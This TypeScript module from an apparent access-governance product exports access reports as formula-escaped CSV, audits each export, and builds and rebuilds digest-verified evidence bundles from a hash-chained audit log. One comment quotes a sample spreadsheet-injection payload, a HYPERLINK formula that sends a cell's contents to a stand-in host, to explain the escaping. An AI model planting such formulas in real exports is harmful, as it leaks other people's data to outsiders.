import { createHash } from 'node:crypto';
import { withTenant } from '@syntra/db';
import { GENESIS_HASH, recordEvent, stableStringify } from '../audit/audit-service.js';
import { integrityStatus, verifySegment } from './audit-integrity.js';
import { readableSnapshot } from './readable.js';
import {
  bodyOf,
  headerOf,
  type ReportEnvelope,
  type ReportHeader,
  type SystemAccessRow,
} from './report-service.js';

/**
 * One row per holding, with EVERY HEADER FIELD REPEATED AS LEADING COLUMNS ON
 * EVERY ROW.
 *
 * A CSV gets opened, filtered, and pasted into something else, and a header
 * that lives only in row 1 does not survive that journey. Repeating it is
 * ugly and it is the only version that stays true after somebody sorts by
 * column D.
 */
/**
 * The characters a spreadsheet treats as the start of a formula.
 *
 * `\t` and `\r` are on the list because Excel and LibreOffice both skip leading
 * whitespace before looking at the first meaningful character, so a cell that
 * begins with a tab and then `=` is a formula.
 */
const FORMULA_INTRODUCERS = ['=', '+', '-', '@', '\t', '\r'];

/**
 * One CSV cell, escaped so it cannot execute and cannot break the record.
 *
 * EVERY VALUE IN THIS EXPORT ORIGINATES IN DIRECTORY OR TARGET DATA, and that
 * is what makes the formula case a real attack rather than a lint rule: the
 * person who names an Active Directory group is a TARGET administrator, not a
 * Syntra one, and inventorying systems Syntra does not control is this module's
 * entire job. A group named `=HYPERLINK("http://x/?"&A2,"click")` executes the
 * moment an auditor opens the export, and the cell beside it is somebody's
 * access.
 *
 * QUOTING IS NOT THE DEFENCE. A spreadsheet strips the quotes before deciding
 * whether the value is a formula, so the previous form -- quote on `"`, `\n`
 * and `,` -- would not have neutralised one even if it had matched. The value
 * has to stop being a formula, which means a leading apostrophe: the
 * convention every spreadsheet reads as "this is text", and which is stripped
 * on display.
 *
 * `\r` is in the quoting test now as well. It was not, so a lone carriage
 * return ended the record and every field after it landed under the wrong
 * header -- silently, in a document whose whole purpose is that somebody can
 * read it a year later.
 *
 * An ordinary value is returned untouched. Quoting or prefixing every cell
 * would make the common case unreadable to defend against the rare one, and an
 * export nobody can read is an export nobody checks.
 */
export function csvCell(value: string): string {
  const dangerous = FORMULA_INTRODUCERS.includes(value.slice(0, 1));
  const body = dangerous ? `'${value}` : value;
  return /["\n\r,]/.test(body) || dangerous ? `"${body.replace(/"/g, '""')}"` : body;
}

export function toCsv(header: ReportHeader, rows: readonly Record<string, string>[]): string {
  const headerColumns: Record<string, string> = {
    snapshot_id: header.snapshotId,
    as_of: header.asOf,
    scope: header.scopeDescription,
    coverage_gaps_in_scope: String(header.coverageGapCount),
    unattributable_holdings_in_scope: String(header.unattributableCount),
    unattributed_accounts_in_tenant: String(header.unattributedAccountCount),
    sources: header.sources
      .map(
        (s) => `${s.sourceName}=${s.completeness}/${s.staleness}@${s.lastSuccessfulReadAt ?? 'never'}`,
      )
      .join(' | '),
  };

  const columns = [...Object.keys(headerColumns), ...Object.keys(rows[0] ?? { note: '' })];
  // ONE name for the escape, so the two rendering paths cannot diverge.
  const escape = csvCell;

  const lines = [columns.join(',')];
  for (const row of rows) {
    lines.push(columns.map((c) => escape(headerColumns[c] ?? row[c] ?? '')).join(','));
  }
  // An empty result still emits its header row and one row saying so, because
  // a zero-byte CSV is indistinguishable from a failed export.
  if (rows.length === 0) {
    lines.push(columns.map((c) => escape(headerColumns[c] ?? 'no rows in this scope')).join(','));
  }
  return lines.join('\n');
}

export async function exportReportCsv(
  tenantId: string,
  actorUserId: string,
  e: ReportEnvelope<{ rows: SystemAccessRow[]; holderCount: unknown }>,
  scope: Record<string, unknown>,
): Promise<string> {
  const header = headerOf(e);
  if (header.live) {
    // AUDITED BEFORE IT THROWS. §10: "the audit log should be able to answer
    // who took a copy of it" -- and a refusal is part of that answer. The
    // successful path was audited and this one was not, so repeated refused
    // attempts left no trace, which is exactly what an attempt to walk out with
    // everybody's access looks like when it does not work the first time.
    //
    // Its OWN transaction, committed before the throw, for the reason the
    // decision path learned the hard way: `withTenant` is
    // `prisma.$transaction(fn)`, so a throw inside the transaction that wrote
    // the row takes the row with it and the trail records nothing.
    await withTenant(tenantId, (tx) =>
      recordEvent(tx, {
        actorUserId,
        action: 'govern.report.export',
        targetType: 'AccessSnapshot',
        targetId: null,
        outcome: 'failure',
        sourceIp: null,
        payload: {
          format: 'csv',
          scope,
          reason: 'live_report',
          statement:
            'a live report has no as-of time, and evidence with no as-of time is not evidence',
        },
      }),
    );
    throw new Error(
      'a live report cannot be exported as evidence: it has no as-of time, and evidence with no as-of time is not evidence',
    );
  }

  const rows = bodyOf(e).rows.flatMap((row) =>
    row.resources.map((resource) => ({
      subject: row.displayName,
      subject_key: row.subjectKey,
      bucket: row.bucket,
      resource_kind: resource.resourceKind,
      resource_name: resource.resourceName,
      // NEVER rendered as a zero, a dash or an omission.
      state: resource.state,
      observed_at: resource.observedAt,
      provenance: resource.provenance,
      last_certified_at: resource.lastCertifiedAt ?? 'never certified',
      last_certified_by: resource.lastCertifiedBy ?? '',
    })),
  );

  const csv = toCsv(header, rows);

  // An export is a bulk read of everybody's access, and the audit log should be
  // able to answer who took a copy of it.
  await withTenant(tenantId, (tx) =>
    recordEvent(tx, {
      actorUserId,
      action: 'govern.report.export',
      targetType: 'AccessSnapshot',
      targetId: header.snapshotId,
      outcome: 'success',
      sourceIp: null,
      payload: { format: 'csv', rowCount: rows.length, scope },
    }),
  );

  return csv;
}

export const BUNDLE_LIMITATIONS: readonly string[] = [
  'This bundle proves that the recorded sequence has not been altered or deleted since it was written, to anybody who cannot recompute the chain.',
  'It CANNOT prove completeness of the world. The chain covers what Syntra recorded. Anything that happened without a Syntra audit event — a group membership added at a domain controller, a permission changed in a SaaS admin console, a row updated with direct SQL — leaves no entry. The absence of an event is not evidence of the absence of an act.',
  'It is NOT proof against the operator. The hash is computed in application code from data in the same database, with no secret. Somebody holding both database write access and the ability to run code can rewrite the chain from any point and recompute every subsequent digest, and the result verifies perfectly.',
  'Timestamps are the application server’s clock, not a trusted timestamp. Ordering within a tenant is guaranteed by the sequence; wall-clock accuracy is guaranteed by nothing.',
  'A certification proves a click, not a judgement. It proves a named, authenticated human recorded a decision against a stated set of facts at a stated time. It does not prove they read anything, that the access was appropriate, or that the facts were true at the target at that instant.',
  'An item marked `undecided` in this bundle was NOT attested. The campaign closed and nobody decided it.',
  'Deletion of the entire log is detectable only by something outside it that remembers the head. That is what anchoring is for, and without anchoring it is not detectable.',
  'Where this bundle covers no campaign, it contains no items and no decisions, and says so on this line rather than by being empty. A campaign bundle with an empty item list is a defect, not a clean review.',
  'The notification set is matched by template and by time window, because Syntra does not record which campaign an outbox row belonged to. It may include a notification from another campaign running in the same period, and it is offered as a record of what was sent rather than as a complete set.',
];

/**
 * The document §17 describes, and the thing it used not to be.
 *
 * Every one of `items`, `decisions`, `reviewers`, `notifications` and
 * `dispatches` was hard-coded `[]`, and the digest was computed over that -- so
 * the bundle VERIFIED, while its own cover made a claim about items it did not
 * contain. An auditor received a signed, digest-checked artifact with zero
 * decisions in it and nothing saying so.
 *
 * The element shapes are written out rather than left as `unknown[]` because
 * this document is the product: an auditor reads these field names, and
 * `unknown` is how a field quietly stops being written.
 */
export interface EvidenceBundle {
  header: ReportHeader;
  limitations: string[];
  /** Null for a report or period bundle, which legitimately covers no campaign. */
  campaignId: string | null;
  snapshot: unknown;
  coverage: unknown;
  items: {
    id: string;
    subjectKey: string;
    systemId: string;
    resourceKind: string;
    resourceId: string;
    resourceName: string;
    status: string;
    statusReason: string | null;
    coverageStatus: string;
    riskFlags: string[];
    observedAt: string;
    holdingSnapshotId: string;
    attributions: unknown;
  }[];
  decisions: {
    id: string;
    itemId: string;
    personId: string;
    decision: string;
    comment: string | null;
    decidedAt: string;
    itemOpenedAt: string;
    /** §17's engagement signals, offered as signals rather than as proof. */
    neverOpened: boolean;
    viaBulk: boolean;
    bulkSize: number | null;
    sessionDecisionOrdinal: number;
    coverageAtDecision: unknown;
  }[];
  reviewers: {
    itemId: string;
    personId: string;
    via: string;
    assignedAt: string;
    unassignedAt: string | null;
    unassignedReason: string | null;
  }[];
  notifications: { template: string; to: string; createdAt: string; sentAt: string | null }[];
  /**
   * Stated on the bundle when the notification set is approximate. See
   * `buildEvidenceBundle`.
   */
  notificationLimitation: string | null;
  dispatches: {
    itemId: string | null;
    route: string;
    status: string;
    message: string | null;
    sequence: number;
    dispatchedAt: string | null;
    confirmedAt: string | null;
    appliedAt: string | null;
  }[];
  chain: {
    fromSequence: number;
    toSequence: number;
    result: string;
    headSequence: number;
    headHash: string;
  };
  digest: string;
}

/**
 * Serialised with the SAME sorted-key discipline `stableStringify` already
 * implements, so the bundle has a stable digest a reader can recompute a year
 * later. A second sorted-key implementation would drift, and a digest nobody
 * can reproduce is a digest that proves nothing.
 */
export function bundleDigest(bundle: Omit<EvidenceBundle, 'digest'>): string {
  return createHash('sha256').update(stableStringify(bundle)).digest('hex');
}

/**
 * Everything the bundle is built from, all of it recorded on the
 * `EvidencePack` row.
 *
 * §17: the digest exists so "a reader can recompute it a year later". It could
 * not, because the document was built from the chain AS IT STOOD -- so
 * re-creating a pack produced a different document with a different digest, and
 * `storageRef` was never written, so there was no other copy either.
 *
 * Building from the recorded range instead makes the bundle a pure function of
 * the row, which is a stronger artifact than filed bytes: it can be recomputed
 * AND checked against the digest that was stored at the time.
 */
export interface EvidenceSpec {
  snapshotId: string;
  campaignId: string | null;
  scope: Record<string, unknown>;
  chainFromSequence: number;
  chainSeedHash: string;
  chainHeadSequence: number;
  chainHeadHash: string;
}

export async function buildEvidenceBundle(
  tenantId: string,
  spec: EvidenceSpec,
): Promise<Omit<EvidenceBundle, 'digest'>> {
  const loaded = await withTenant(tenantId, async (tx) => {
    const snapshot = await readableSnapshot(tx, spec.snapshotId);
    const sources = await tx.snapshotSource.findMany({ where: { snapshotId: snapshot.id } });
    const gaps = await tx.coverageGap.findMany({ where: { snapshotId: snapshot.id } });
    return { snapshot, sources, gaps };
  });

  // BOUNDED AT THE HEAD THE PACK RECORDED, which is what makes the rebuild
  // reproducible at all. Without `maxSequence` the walk runs to the chain as it
  // stands TODAY, so every audit event written after the pack -- including the
  // `govern.evidence.create` event the pack itself writes -- moves
  // `segment.toSequence` and changes the digest. A year later the document
  // would differ from the one that was signed, for no reason but the passage of
  // time.
  const segment = await verifySegment(tenantId, spec.chainFromSequence, spec.chainSeedHash, {
    maxSequence: spec.chainHeadSequence,
  });

  // ---- the campaign's own record ------------------------------------------
  //
  // ONE transaction of reads, and every one of them bounded by the campaign
  // rather than by the tenant. A 50,000-item campaign's bundle is a large
  // document by construction and that is correct -- it is the record somebody
  // signs against -- but it must not be assembled by a query per item.
  const campaignId = spec.campaignId;
  const campaign =
    campaignId === null
      ? null
      : await withTenant(tenantId, async (tx) => {
          const row = await tx.campaign.findUniqueOrThrow({ where: { id: campaignId } });
          const items = await tx.campaignItem.findMany({
            where: { campaignId },
            orderBy: { id: 'asc' },
          });
          const decisions = await tx.campaignDecision.findMany({
            where: { item: { campaignId } },
            orderBy: [{ decidedAt: 'asc' }, { id: 'asc' }],
          });
          const reviewers = await tx.campaignItemReviewer.findMany({
            where: { item: { campaignId } },
            orderBy: { id: 'asc' },
          });
          const dispatches = await tx.revocationDispatch.findMany({
            where: { batch: { campaignId } },
            orderBy: [{ batchId: 'asc' }, { sequence: 'asc' }],
          });
          // MATCHED BY TEMPLATE AND WINDOW, because `NotificationOutbox` has no
          // campaign column -- it carries `requestId` for Automate and nothing
          // for Govern. Approximate, and the bundle says so on its cover rather
          // than presenting a partial set as a complete one.
          const notifications = await tx.notificationOutbox.findMany({
            where: {
              template: { startsWith: 'govern-review-' },
              createdAt: { gte: row.createdAt, lte: row.dueAt },
            },
            orderBy: { createdAt: 'asc' },
          });
          return { items, decisions, reviewers, dispatches, notifications };
        });

  const header: ReportHeader = {
    snapshotId: loaded.snapshot.id,
    asOf: loaded.snapshot.asOf.toISOString(),
    live: false,
    sources: loaded.sources.map((s) => ({
      sourceKind: s.sourceKind,
      sourceId: s.sourceId,
      sourceName: s.sourceName,
      lastSuccessfulReadAt: s.lastSuccessfulReadAt?.toISOString() ?? null,
      completeness: s.completeness,
      staleness: s.staleness,
      ageHours:
        s.lastSuccessfulReadAt === null
          ? null
          : (loaded.snapshot.asOf.getTime() - s.lastSuccessfulReadAt.getTime()) / 3_600_000,
      gapCount: s.gapCount,
    })),
    coverageGapCount: loaded.snapshot.coverageGapCount,
    unattributableCount: loaded.snapshot.unattributableCount,
    unattributedAccountCount: loaded.snapshot.unattributedAccountCount,
    scopeDescription: JSON.stringify(spec.scope),
  };

  return {
    header,
    // Printed on the COVER of every bundle, not kept in a caveats appendix,
    // because the harm this module causes is somebody over-reading its output.
    limitations: [...BUNDLE_LIMITATIONS],
    campaignId: spec.campaignId,
    snapshot: {
      id: loaded.snapshot.id,
      asOf: loaded.snapshot.asOf.toISOString(),
      holdingCount: loaded.snapshot.holdingCount,
      unattributableCount: loaded.snapshot.unattributableCount,
    },
    coverage: loaded.gaps.map((g) => ({ kind: g.kind, reason: g.reason, systemId: g.systemId })),
    items: (campaign?.items ?? []).map((i) => ({
      id: i.id,
      subjectKey: i.subjectKey,
      systemId: i.systemId,
      resourceKind: i.resourceKind,
      resourceId: i.resourceId,
      resourceName: i.resourceName,
      status: i.status,
      statusReason: i.statusReason,
      coverageStatus: i.coverageStatus,
      riskFlags: i.riskFlags,
      observedAt: i.observedAt.toISOString(),
      holdingSnapshotId: i.holdingSnapshotId,
      attributions: i.attributions,
    })),
    decisions: (campaign?.decisions ?? []).map((d) => ({
      id: d.id,
      itemId: d.itemId,
      personId: d.personId,
      decision: d.decision,
      comment: d.comment,
      decidedAt: d.decidedAt.toISOString(),
      itemOpenedAt: d.itemOpenedAt.toISOString(),
      neverOpened: d.neverOpened,
      viaBulk: d.viaBulk,
      bulkSize: d.bulkSize,
      sessionDecisionOrdinal: d.sessionDecisionOrdinal,
      coverageAtDecision: d.coverageAtDecision,
    })),
    reviewers: (campaign?.reviewers ?? []).map((r) => ({
      itemId: r.itemId,
      personId: r.personId,
      via: r.via,
      assignedAt: r.assignedAt.toISOString(),
      unassignedAt: r.unassignedAt?.toISOString() ?? null,
      unassignedReason: r.unassignedReason,
    })),
    notifications: (campaign?.notifications ?? []).map((n) => ({
      template: n.template,
      to: n.to,
      createdAt: n.createdAt.toISOString(),
      sentAt: n.sentAt?.toISOString() ?? null,
    })),
    notificationLimitation:
      campaign === null
        ? null
        : 'matched by template and by the campaign’s own window, because no column records which campaign an outbox row belonged to',
    dispatches: (campaign?.dispatches ?? []).map((d) => ({
      itemId: d.itemId,
      route: d.route,
      status: d.status,
      message: d.message,
      sequence: d.sequence,
      dispatchedAt: d.dispatchedAt?.toISOString() ?? null,
      confirmedAt: d.confirmedAt?.toISOString() ?? null,
      appliedAt: d.appliedAt?.toISOString() ?? null,
    })),
    chain: {
      fromSequence: segment.fromSequence,
      toSequence: segment.toSequence,
      result: segment.result,
      headSequence: spec.chainHeadSequence,
      headHash: spec.chainHeadHash,
    },
  };
}

export async function createEvidencePack(
  tenantId: string,
  actorUserId: string,
  input: {
    kind: 'campaign' | 'report' | 'period';
    snapshotId?: string | undefined;
    campaignId?: string | undefined;
    scope: Record<string, unknown>;
  },
): Promise<{ id: string; digest: string; bundle: EvidenceBundle }> {
  const anchor = await withTenant(tenantId, async (tx) => {
    const snapshot = await readableSnapshot(tx, input.snapshotId);
    const status = await integrityStatus(tx, false);
    const lastCheckpoint = await tx.auditCheckpoint.findFirst({ orderBy: { sequence: 'desc' } });
    return { snapshotId: snapshot.id, status, lastCheckpoint };
  });

  const spec: EvidenceSpec = {
    snapshotId: anchor.snapshotId,
    campaignId: input.campaignId ?? null,
    scope: input.scope,
    chainFromSequence: (anchor.lastCheckpoint?.sequence ?? 0) + 1,
    chainSeedHash: anchor.lastCheckpoint?.hash ?? GENESIS_HASH,
    chainHeadSequence: anchor.status.headSequence,
    chainHeadHash: anchor.status.headHash,
  };

  const withoutDigest = await buildEvidenceBundle(tenantId, spec);
  const digest = bundleDigest(withoutDigest);
  const bundle: EvidenceBundle = { ...withoutDigest, digest };
  const body = JSON.stringify(bundle);

  const id = await withTenant(tenantId, async (tx) => {
    const pack = await tx.evidencePack.create({
      data: {
        tenantId,
        kind: input.kind,
        scope: input.scope as never,
        snapshotId: spec.snapshotId,
        campaignId: spec.campaignId,
        chainHeadSequence: spec.chainHeadSequence,
        chainHeadHash: spec.chainHeadHash,
        chainVerificationResult: bundle.chain.result,
        chainFromSequence: bundle.chain.fromSequence,
        chainToSequence: bundle.chain.toSequence,
        digest,
        byteLength: Buffer.byteLength(body, 'utf8'),
        createdByUserId: actorUserId,
      },
    });
    // `storageRef` STOPS BEING A LIE. The column's own comment says it is
    // "where the bytes live", and it was never written -- so a bundle could not
    // be fetched again, and re-creating one produced a different document
    // because the chain head had moved. It names the route that rebuilds this
    // pack from its own recorded range.
    await tx.evidencePack.update({
      where: { id: pack.id },
      data: { storageRef: `/api/admin/govern/evidence/${pack.id}` },
    });
    await recordEvent(tx, {
      actorUserId,
      action: 'govern.evidence.create',
      targetType: 'EvidencePack',
      targetId: pack.id,
      outcome: 'success',
      sourceIp: null,
      payload: {
        kind: input.kind,
        digest,
        chainResult: bundle.chain.result,
        scope: input.scope,
        itemCount: bundle.items.length,
        decisionCount: bundle.decisions.length,
      },
    });
    return pack.id;
  });

  return { id, digest, bundle };
}

/**
 * Rebuilds a pack from its own recorded range and says whether the result still
 * digests to what was stored.
 *
 * `digestMatches: false` is not an error to swallow. It means the document a
 * pack describes is no longer the document that was signed -- which is either a
 * pruned snapshot, an edited campaign, or the thing §17 says hash chaining
 * exists to detect -- and the caller has to be able to say so on the screen.
 */
export async function fetchEvidencePack(
  tenantId: string,
  packId: string,
): Promise<{ bundle: EvidenceBundle; digestMatches: boolean }> {
  const pack = await withTenant(tenantId, (tx) =>
    tx.evidencePack.findUniqueOrThrow({ where: { id: packId } }),
  );
  if (pack.snapshotId === null) {
    throw new Error('this evidence pack names no snapshot, so it cannot be rebuilt');
  }

  const withoutDigest = await buildEvidenceBundle(tenantId, {
    snapshotId: pack.snapshotId,
    campaignId: pack.campaignId,
    scope: pack.scope as Record<string, unknown>,
    chainFromSequence: pack.chainFromSequence,
    // The seed is the checkpoint hash the original walk started from. It is not
    // stored, and it does not need to be: `chainFromSequence` is 1 exactly when
    // the walk began at genesis, and otherwise the checkpoint at
    // `chainFromSequence - 1` is the one it seeded on.
    chainSeedHash: await seedHashFor(tenantId, pack.chainFromSequence),
    chainHeadSequence: pack.chainHeadSequence,
    chainHeadHash: pack.chainHeadHash,
  });

  const bundle: EvidenceBundle = { ...withoutDigest, digest: bundleDigest(withoutDigest) };
  return { bundle, digestMatches: bundle.digest === pack.digest };
}

async function seedHashFor(tenantId: string, fromSequence: number): Promise<string> {
  if (fromSequence <= 1) return GENESIS_HASH;
  const checkpoint = await withTenant(tenantId, (tx) =>
    tx.auditCheckpoint.findFirst({
      where: { sequence: fromSequence - 1 },
      orderBy: { verifiedAt: 'desc' },
    }),
  );
  return checkpoint?.hash ?? GENESIS_HASH;
}
